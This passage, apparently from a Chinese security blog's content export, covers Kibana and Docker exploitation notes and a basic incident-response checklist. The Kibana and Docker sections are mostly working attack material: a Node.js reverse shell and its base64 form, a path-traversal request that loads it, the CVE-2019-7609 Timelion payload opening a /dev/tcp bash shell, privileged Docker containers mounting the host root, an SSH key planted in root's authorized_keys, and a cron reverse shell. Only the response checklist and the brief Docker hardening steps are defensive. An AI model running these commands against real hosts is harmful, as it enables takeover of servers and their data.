port:8080        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    &#125;);    return /a/; // Prevents the Node.js application form crashing&#125;)();base64格式：ZnVuY3Rpb24oKXsKICAgIHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwKICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwKICAgICAgICBzaCA9IGNwLnNwYXduKCIvYmluL3NoIiwgW10pOwogICAgdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CiAgICBjbGllbnQuY29ubmVjdCg3Nzc3LCAiMTAuMjExLjU1LjEzIiwgZnVuY3Rpb24oKXsgICAgLy92cHNfaXA6MTkyLjE2OC4zMy4xICBwb3J0OjgwODAKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmb3JtIGNyYXNoaW5nCn0pKCk7</code></pre><pre><code class="zsh">echo &quot;&lt;shell.js base64 encoded string &gt;&quot; | base64 -d &gt;&gt;/tmp/shell.jsnc -lvp 7777 # 本地监听7777端口curl &#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js&#39;</code></pre><h4 id="Kinana远程代码执行"><a href="#Kinana远程代码执行" class="headerlink" title="Kinana远程代码执行"></a>Kinana远程代码执行</h4><p>存在漏洞版本：<br><strong>Kibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞</strong></p><p>该漏洞触发，需要Timelion 和 Canvas插件</p><pre><code class="zsh">http://192.168.79.207:5601/app/kibana#/management?_g=()   #查看Kibana版本</code></pre><p>点在<strong>Timelion</strong>处,直接填入<strong>payload</strong>，点击<strong>run</strong></p><pre><code class="zsh">.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;).es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;/bin/touch /tmp/success&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>成功后，再访问<strong>“Canvas”</strong>页面触发命令<code>/bin/touch /tmp/success</code>，</p><p><img src="../images/kibana-2.png" alt="kibana-2"></p><p><a href="https://github.com/LandGrey/CVE-2019-7609/">Kibana_RCE_CVE-2019-7609</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="Kali/Exploit/Docker.html"/>
      <url>Kali/Exploit/Docker.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> 信息收集</li><li><input checked="" disabled="" type="checkbox"> 漏洞利用</li></ul><p>Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p><h2 id="Docker-Registry-API未授权访问"><a href="#Docker-Registry-API未授权访问" class="headerlink" title="Docker Registry API未授权访问"></a>Docker Registry API未授权访问</h2><p>更多用法参考<a href="https://docs.docker.com/registry/spec/api/">Registry API</a></p><h3 id="Nmap探测"><a href="#Nmap探测" class="headerlink" title="Nmap探测"></a>Nmap探测</h3><pre><code class="zsh"> nmap -Pn -T4  -sV -p 18093 10.200.88.6                                                                          130 ↵Nmap scan report for 10.200.88.6Host is up (0.067s latency).PORT      STATE SERVICE VERSION18093/tcp open  http    Docker Registry (API: 2.0)</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><pre><code class="zsh">curl http://10.200.88.6:18093/v2/_catalog  # 获取仓库列表&#123;&quot;repositories&quot;:[&quot;ondp-web&quot;]&#125;curl http://10.200.88.6:18093/v2/ondp-web/tags/list  # 获取指定仓库中镜像的tags列表&#123;&quot;name&quot;:&quot;ondp-web&quot;,&quot;tags&quot;:[&quot;1.1.0-61752&quot;]&#125;</code></pre><h2 id="Docker-Remote-API未授权访问"><a href="#Docker-Remote-API未授权访问" class="headerlink" title="Docker Remote API未授权访问"></a>Docker Remote API未授权访问</h2><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和  1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建  container，删除已有 container，甚至是获取宿主机的 shell。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h4><pre><code class="zsh">nmap -Pn -T4  -sV -p 2375  192.168.79.207                                                                                                             Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:34 CSTHost is up (0.28s latency).PORT     STATE SERVICE VERSION2375/tcp open  docker  Docker 19.03.13Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds</code></pre><h4 id="docker版本、容器信息"><a href="#docker版本、容器信息" class="headerlink" title="docker版本、容器信息"></a>docker版本、容器信息</h4><ul><li>通过curl命令查看</li></ul><pre><code class="zsh">curl &#39;http://192.168.79.207:2375/version&#39;       # 查看docker运行的版本信息                                                                                                                &#123;&quot;Platform&quot;:&#123;&quot;Name&quot;:&quot;Docker Engine - Community&quot;&#125;,&quot;Components&quot;:[&#123;&quot;Name&quot;:&quot;Engine&quot;,&quot;Version&quot;:&quot;19.03.13&quot;,&quot;Details&quot;: ...&#123;&quot;GitCommit&quot;:&quot;fec3683&quot;&#125;&#125;],&quot;Version&quot;:&quot;19.03.13&quot;,&quot;ApiVersion&quot;:&quot;1.40&quot;,&quot;MinAPIVersion&quot;:&quot;1.12&quot;,&quot;GitCommit&quot;:&quot;4484c46d9d&quot;,&quot;GoVersion&quot;:&quot;go1.13.15&quot;,&quot;Os&quot;:&quot;linux&quot;,&quot;Arch&quot;:&quot;amd64&quot;,&quot;KernelVersion&quot;:&quot;4.15.0-29-generic&quot;,&quot;BuildTime&quot;:&quot;2020-09-16T17:01:06.000000000+00:00&quot;&#125;curl &#39;http://192.168.79.207:2375/&lt;容器id&gt;/info&#39;       # 查看容器运行的信息                                                                                                                curl &#39;http://192.168.79.207:2375/containers/json?all=1&#39;  # 获取全部容器列表[&#123;&quot;Id&quot;:&quot;68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545&quot;,&quot;Names&quot;:[&quot;/reverent_bell&quot;],&quot;Image&quot;:&quot;ubuntu:18.04&quot;,&quot;ImageID&quot;:&quot;sha256:2c047404e52d7f17bdac4121a13cd844447b74e13063f8cb8f8b314467feed06&quot;,&quot;Command&quot;:&quot;sh -c &#39;echo /dev/null&#39;&quot;,&quot;Created&quot;:1607475496,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 4 hours&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;: ...&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;5001dfbe94e8ad314a58ad790b10086d6accf0173bc1bfbc6d4e54d3e219ac24&quot;,&quot;EndpointID&quot;:&quot;3903fce3838f4002ca8f7142f77ffca4779d6293d4f84b5ca28d4f481c1d9177&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.7&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:07&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[]&#125;]curl &#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/json&#39;  # 查看具体容器的详细信息curl &#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/export&#39;  # 导出具体的镜像curl &#39;http://192.168.79.207:2375/images/json?all=1&#39;  # 获取全部镜像列表</code></pre><p>更多用法参考<a href="https://docs.docker.com/engine/api/v1.24/#3-endpoints">Docker Remote API</a></p><ul><li>通过docker -H查看</li></ul><pre><code class="zsh">docker -H tcp://192.168.79.207 version  #查看docker版本信息docker -H tcp://192.168.79.207 images  #查看目标机器的镜像docker  -H tcp://192.168.79.207   ps -a   # 查看服务器运行的容器有哪些CONTAINER ID        IMAGE                              COMMAND                  CREATED              STATUS                     PORTS               NAMES8069f1b5cd72        5301ebcf503e                       &quot;/bin/sh -c &#39;curl --…&quot;   About a minute ago   Created                                        friendly_dhawan</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="运行新镜像并提权"><a href="#运行新镜像并提权" class="headerlink" title="运行新镜像并提权"></a>运行新镜像并提权</h4><ul><li>BurpSuite方式-不推荐<ul><li>创建容器，返回容器id<pre><code class="zsh">POST /containers/create HTTP/1.1Host: 192.168.79.207:2375Content-Type: application/jsoncache-control: no-cachePostman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e&#123;&quot;Image&quot;:&quot;ubuntu:18.04&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/root/:/tmp/:rw&quot; ]&#125;,&quot;CMD&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC6kYan1DO/mcdvu8WcYvmXbEh4WzHqy9k0yeoN0AY40Gg2tnP9TTDMHUWwT5EZk4+hkL7UMr+CMhjnqucZKX5Yw/GhF3kwQZN/NCu3GtJ3/Abl6G6y3J4ej0Q85kFPnPyIM5ZRygTqq728HaHWDgqwjqSG35Dh7pjuvIV8ULuekYpeFN607bEZ0lM3vt3/Kf/fBZQseZYSoj4/S+hWTmVivDThBGECcbCEpVACX3LLSqMvYEURUlEbE+f9qpLV1y7rSIQNJu3VsitHy2m7TAxScxAYsu3MhJFWYQVUZOlUEatW0Q3Ch9iLvD/H5rnBe+ps6088sp/P0CgzrElPChZ root@kali&#39; &gt;&gt; /tmp/.ssh/authorized_keys&quot;]&#125;------WebKitFormBoundary7MA4YWxkTrZu0gW-- </code></pre></li><li>连接容器</li></ul></li></ul><pre><code class="zsh">POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1&amp;stdin=1&amp;stdout=1&amp;stream=1 HTTP/1.1Host: 172.26.1.97:2375User-Agent: Docker-Client/1.7.0 (windows)Content-Length: 0Content-Type: application/jsonAccept-Encoding: gzip</code></pre><ul><li><p>启动容器</p><pre><code class="zsh">POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/start HTTP/1.1Host: 172.26.1.97:2375User-Agent: Docker-Client/1.7.0 (windows)Content-Length: 0Content-Type: application/jsonAccept-Encoding: gzip</code></pre></li><li><p>命令行方式-推荐</p></li></ul><pre><code class="zsh">docker -H 10.211.55.13:2375 run --rm -it --privileged --net host -v /:/mnt alpinedocker  -H tcp://10.200.30.64:2375 run -it -v /:/mnt platform_of_check /bin/bashdocker -H tcp://192.168.79.207  run –rm –privileged -it -v /:/mnt busybox chroot /mnt --entrypoint sh  # 以宿主root的身份启动busybox容器,并将宿主根目录/挂载到busybox容器的/mnt目录下，并切换busybox的根目录为/mnt目录，最后运行sh命令参数解释：-rm 容器停止时自动删除该容器--privileged 容器拥有宿主机的root权限-it 开启tty终端-v 挂载目录 格式为 宿主系统目录:容器目录. /:/mnt指将宿主系统根目录挂在到容器中的/mnt目录上busybox 镜像名字 ,busybox体积小，同时命令齐全chroot /mnt 将根目录切换到/mnt上   --entrypoint sh 执行sh</code></pre><ul><li><a href="https://github.com/Tycx2ry/docker_api_vul">docker_api_vul</a></li></ul><h4 id="写入定时任务"><a href="#写入定时任务" class="headerlink" title="写入定时任务"></a>写入定时任务</h4><pre><code class="zsh">docker -H tcp://192.168.79.207:2375 image  # 查看宿主机可用镜像docker -H tcp://192.168.79.207:2375 run -it -v /var/spool/cron/:/var/spool/cron/ &lt;image_id&gt; /bin/bash   # 进入容器，并将宿主机/var/spool/cron/目录挂载到容器/var/spool/cron/目录下root@bfd2539dfdc8:/# echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/attack_ip/8088 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root   # 写入反弹shell命令到定时任务中</code></pre><h3 id="MSF相关模块"><a href="#MSF相关模块" class="headerlink" title="MSF相关模块"></a>MSF相关模块</h3><pre><code class="zsh">msf6 exploit(linux/http/docker_daemon_tcp) &gt; optionsModule options (exploit/linux/http/docker_daemon_tcp):   Name          Current Setting          Required  Description   ----          ---------------          --------  -----------   CONTAINER_ID                           no        container id you would like   DOCKERIMAGE   alpine:latest            yes       hub.docker.com image to use   Proxies       socks4://127.0.0.1:7891  no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT         2375                     yes       The target port (TCP)   SSL           false                    no        Negotiate SSL/TLS for outgoing connections   VHOST                                  no        HTTP server virtual hostPayload options (linux/x64/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.79.207   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p><ol><li>设置ACL，仅允许信任的来源IP连接；</li><li>修改docker swarm的认证方式，使用TLS认证</li></ol><p>客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：</p><pre><code class="zsh">docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://x.x.x.x:2375 -H unix:///var/run/docker.sock</code></pre><p>客户端连接时需要设置以下环境变量</p><pre><code class="zsh">export DOCKER_TLS_VERIFY=1export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://x.x.x.x:2375export DOCKER_API_VERSION=1.12</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>应急响应基础篇</title>
      <link href="Response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%AF%87.html"/>
      <url>Response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<p>应急响应基础篇</p><p>[toc]</p><h2 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h2><ul><li>[ProcessExplorer] 是进程管理工具，能管理隐藏在后台运行的程序，可监视、挂起、重启、强行终止任何程序，包括系统级的不允许随便终止的关键进程等。</li><li><a href="https://www.bleepingcomputer.com/download/pc-hunter/">PCHunter</a> 一个功能强大的Windows系统信息查看软件，同时也是手工杀毒软件，不但可以查看各类系统信息，还可以查计算机中潜伏的挖矿木马。</li></ul><blockquote><p>Windows</p></blockquote><ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysinternalSuite</a></li><li><a href="https://www.bleepingcomputer.com/download/pc-hunter/">PCHunter</a>/<a href="http://bbs.huorong.cn/forum.php?mod=forumdisplay&fid=55&filter=typeid&typeid=44">火绒剑</a>/<a href="http://powertool.s601.xrea.com/">PowerTool</a></li><li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a></li><li><a href="https://www.filehorse.com/download-event-log-explorer/">Event Log Explorer</a></li><li><a href="https://www.snapfiles.com/get/fulleventlogview.html">FullEventLogView</a></li><li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a></li><li>[WinPrefetch View]</li><li>[WifiHistory View]</li></ul><blockquote><p>Linux</p></blockquote><ul><li><a href="https://github.com/heikanet/whohk/releases">Linux应急响应辅助工具</a></li><li><a href="https://github.com/G4rb3n/Script-Ganker">Linux恶意脚本检测分类工具</a></li><li><a href="https://github.com/heikanet/dc_find">批量暗链检测工具</a></li></ul><blockquote><p>勒索病毒搜索引擎</p></blockquote><ul><li><a href="https://lesuobingdu.qianxin.com/">奇安信勒索病毒搜索引擎</a></li><li><a href="https://lesuo.venuseye.com.cn/">启明VenuEeye勒索病毒搜索引擎</a></li><li><a href="https://lesuobingdu.360.cn/">360勒索病毒搜索引擎</a></li><li><a href="https://guanjia.qq.com/pr/ls/">腾讯勒索病毒搜索引擎</a></li><li><a href="https://edr.sangfor.com.cn/#/information/ransom_search">深信服勒索病毒搜索引擎</a></li></ul><blockquote><p>勒索病毒解密工具</p></blockquote><ul><li><a href="https://www.nomoreransom.org/zh/index.html">nomoreransom勒索软件解密工具集</a></li><li><a href="https://id-ransomware.malwarehunterteam.com/">MalwareHunterTeam勒索软件解密工具集</a></li><li><a href="https://github.com/jiansiting/Decryption-Tools">Github解密工具汇总</a></li><li><a href="https://habo.qq.com/tool/index">腾讯哈勃勒索软件专杀工具</a></li><li><a href="https://www.trendmicro.com/zh_hk/forHome/products/free-tools.html">趋势科技勒索病毒解密工具</a></li><li><a href="https://www.duba.net/dbt/wannacry.html">金山毒霸勒索病毒免疫工具</a></li><li><a href="https://bbs.huorong.cn/thread-65355-1-1.html">火绒安全工具下载</a></li><li><a href="http://it.rising.com.cn/fanglesuo/index.html">瑞星解密工具下载</a></li><li><a href="https://noransom.kaspersky.com/">卡巴斯基免费勒索解密器</a></li><li><a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">Avast免费勒索软件解密工具</a></li><li><a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">Emsisoft免费勒索软件解密工具</a></li><li>Linux勒索病毒样本 <a href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a></li></ul><h2 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h2><p>网络拓扑、业务架构、服务器类型等信息<br>感染主机相关信息</p><ul><li>系统名称、节点、主机名</li><li>物理机/虚拟机</li><li>操作系统及版本</li><li>IP地址、开放端口</li><li>中间件及版本</li><li>数据库类型</li><li>Web框架等</li></ul><h3 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在搜索框中键入<code>msinfo32</code> 。<br>用鼠标右键单击搜索结果中的<code>系统信息</code>，然后选择<code>以管理员身份运行</code>。<br><img src="../images/resp-1.png" alt="resp-1"></p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre><code class="zsh">lscpu  # 查看CPU相关信息，包括型号、主频、内核等信息uname -a   # 查看当前操作系统信息cat /proc/version #查看当前操作系统版本lsmod  # 查看所有已载入系统的模块信息</code></pre><h3 id="系统用户信息"><a href="#系统用户信息" class="headerlink" title="系统用户信息"></a>系统用户信息</h3><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><ol><li><p>命令行查看</p><blockquote><p>&amp;rem 为cmd下的注释符</p></blockquote><pre><code class="zsh">net user   &amp;rem 收集用户账户信息，但看不到以$结尾的隐藏账户net user &lt;username&gt;  &amp;rem 查看指定用户的详细信息</code></pre></li><li><p>GUI查看<br> 在cmd中输入<code>compmgmt.msc</code>即可调出<em>计算机管理</em>窗口<br> <img src="../images/resp-2.png" alt="resp-2"></p></li><li><p>注册表查看<br> 配置当用用户拥有对SAM的读取权限,配置后按F5刷新<br> <img src="../images/resp-3.png" alt="resp-3"></p><blockquote><p>在第3步选中账户给予：<strong>完全控制</strong> 亦可。</p></blockquote><p> <img src="../images/resp-4.png" alt="resp-4"></p></li><li><p>wmic查看</p><blockquote><p>wmic是WMI(Widnwos Management Instrumentation)的扩展，<br>提供从命令行接口和批命令脚本执行系统管理命令</p></blockquote><pre><code class="zsh">wmic useraccount get name,sid  &amp;rem 获取系统中用户名和系统的SID值</code></pre></li></ol><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><pre><code class="zsh">cat /etc/passwd   # 查看系统所有用户信息awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd   # 查看用户UID为0的账户，即root账户awk -F:&#39;length($2)==0&#123;print $1&#125;&#39; /etc/shadow # 查看是否存在空口令账户cat /etc/passwd | grep &#39;/bin/bash&#39;  # 查看可登陆的用户last  # 查看显示近期用户或终端的登录情况lastlog  # 查看登陆过所有用户的最近一次登陆时间lastb  # 查看登陆失败的用户账户信息who   # 查看当前登陆系统的用户</code></pre><p><code>last -f</code> 指定数据源,如下:</p><ul><li>/var/log/wtmp 存储登陆成功信息</li><li>/var/log/btmp 存储登陆失败信息</li><li>/var/log/utmp 存储当前正在登陆的信息</li></ul><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><p>重点查找开机启动项中的可疑启动项</p><h4 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h4><pre><code>1. 通过【系统配置】对话框查看</code></pre><p><img src="../images/resp-5.png" alt="resp-5"></p><pre><code>2. 通过注册表查看</code></pre><blockquote><p>路径：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p></blockquote><p><img src="../images/resp-6.png" alt="resp-6"></p><h4 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h4><pre><code class="zsh">more /etc/init.d/rc.local /etc/rc.d/rc[0-6].d  # 查看rc.local文件内容ls -alt /etc/init.d/   # 查看init.d文件夹下所有文件的详细信息</code></pre><h3 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h3><h4 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h4><blockquote><p>通过计算机管理窗口查询<br>通过powershell查询<br>通过cmd查询<br><img src="../images/resp-7.png" alt="resp-7"></p></blockquote><h4 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h4><pre><code class="zsh">crontab -u root  -l  # 查看root用户的计划任务more /etc/cron*/   # 查看cron下的定时任务cat /etc/crontab   # 查看系统的任务计划crontab -u root -l  # 查看用户的任务计划cat /etc/anacrontab   # 查看anacrontab中的任务cat /root/.bash_history  #查看历史命令</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1.Windows补丁<br>通过<code>systeminfo</code>排查MS17-010漏洞补丁</p><p>操作系统对应MS17-010的补丁号<br>|系统|补丁号|<br>|:—:|:—:|<br>|WinXP|KB4012598|<br>|Win2003|KB4012598|<br>|Win2008R2|KB4012212、KB4012215|<br>|Win7|KB4012212、KB4012215|</p><ol start="2"><li>Windows防火墙规则<pre><code class="zsh">netsh firewall show state</code></pre><img src="../images/resp-8.png" alt="resp-8"></li></ol><h2 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h2><p>文件排查排查根据：<br>根据勒索病毒加密时间对文件夹内文件列表时间进行排序</p><ul><li>查找距离文件加密事件1-3天创建和修改的文件</li><li>查找可疑时间点创建和修改的文件</li></ul><h3 id="Windows-4"><a href="#Windows-4" class="headerlink" title="Windows"></a>Windows</h3><h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><ol><li>各个盘下的Temp目录</li></ol><ul><li><code>C:\Windows\Temp\</code></li><li><code>C:\Users\&lt;user&gt;\AppData\Local\Temp\</code></li><li><code>C:\Users\&lt;user&gt;\Desktop\</code></li><li><code>C:\Users\&lt;user&gt;\Downloads\</code></li><li><code>C:\Users\&lt;user&gt;\Pictures\</code></li></ul><p>可疑文件名称：</p><ul><li>svchost.exe</li><li>WindowsUpdate.exe</li><li>Ares.exe</li><li>Snake.exe</li><li>其他异常名</li></ul><ol start="2"><li><p>浏览器历史记录，下载记录</p></li><li><p>用户Recent文件</p><blockquote><p>C:\Documents and Settings\Administrator\Recent<br>C:\Documents and Settings\Default User\Recent  </p></blockquote></li><li><p>预读取文件夹Prefetch</p><blockquote><p>C:\Windows\Prefetch<br>%SystemRoot%\appcompat\Programs\  查询Amcache.hve文件所在目录，可以查询用用程序的执行路径，上次执行的时间及SHA1值</p></blockquote></li></ol><p><img src="../images/resp-9.png" alt="resp-9"></p><h4 id="时间点查找"><a href="#时间点查找" class="headerlink" title="时间点查找"></a>时间点查找</h4><pre><code class="zsh">forfiles  /m *.exe   /d +2020/12/05  /s  /p C:\  /c &quot;cmd /c echo @path @fdate @ftime &quot; 2&gt; null  &amp;rem 针对2020-12-5日后的exe新建文件进行搜索</code></pre><h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><p>可利用D盾、HwsKill、WebshellKill等工具对目录下的文件进行规则查询</p><h3 id="Linux-4"><a href="#Linux-4" class="headerlink" title="Linux"></a>Linux</h3><ul><li>通过<code>stat</code>命令查看相关时间，若修改时间与文件加密日期接近</li><li>通过<code>find . *.txt -perm 777</code>查看当前目录下权限为777的文件</li><li>通过<code>ls -ar | grep &quot;^\.&quot;</code>查看当前目录下的隐藏文件</li></ul><pre><code class="zsh">cat /etc/passwd | grep -E &quot;/bin/bash$&quot;  # 查看能够登陆系统的账户</code></pre><h4 id="敏感目录-1"><a href="#敏感目录-1" class="headerlink" title="敏感目录"></a>敏感目录</h4><ul><li>/usr/bin 和/usr/sbin</li><li>.ssh/ 和/etc/ssh</li><li>/tmp</li></ul><h4 id="时间点查找-1"><a href="#时间点查找-1" class="headerlink" title="时间点查找"></a>时间点查找</h4><pre><code class="zsh">find / -ctime 0 -name &quot;*.sh&quot;  # 查找一天内新增的sh文件ls -alt | head -n 10  # 列出最近修改的10个文件stat &lt;xx.sh&gt;   # 对xx.sh的创建、修改、访问时间进行排查</code></pre><h4 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h4><ol><li>常规检查<pre><code class="zsh">find / -type f -perm -04000 -ls -uid 0 2&gt;/dev/null   # 排查SUID程序find /tmp -perm 777 | more  # 查找777权限的文件find /var/www/ -name &quot;*.php&quot; |xargs egrep &#39;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval\(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&#39;   # 查找/var/www目录下的webshellfind ./ -type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot;  #查看网页是否有webshell特征find ./ -type f -name &quot;*.asp&quot; | xargs grep &quot;execute(&quot;find ./ -type f -name &quot;*.aspx&quot; | xargs grep &quot;eval(&quot;</code></pre></li></ol><p>ls -alt /bin  # 对系统命令进行排查，查看命令目录中相关系统命令的修改时间<br>ls -alh /bin  # 对系统命令进行排查，查看命令目录中相关系统命令的文件大小</p><pre><code>2. 后门查杀    - [chkrootkit] 检测rootkit是否被安装到系统中    ```zsh    chkroot -q | grep INFECTED  #若发现rootkit后门，建议重装系统    ```    - [rkhunter] 检测系统命令，包括MD5校验，本机敏感目录，系统配置，服务及套件，第三方应用版本等。    ```zsh    rkhunter --check    ```[chkrootkit]: https://github.com/Magentron/chkrootkit.git[rkhunter]: https://github.com/installation/rkhunter.git## 进程排查#### Windows##### 通过`taskmgr`查看&gt; 添加【命令行】、【映射路径名称】列，获取更多信息![resp-10](../images/resp-10.png)重点关注CPU、内存占用过高，网络使用率过高的进程##### 通过`tasklist`查看重点关注随机命名的进程，可通过威胁平台判定是否为恶意进程```zshtasklist  &amp;rem 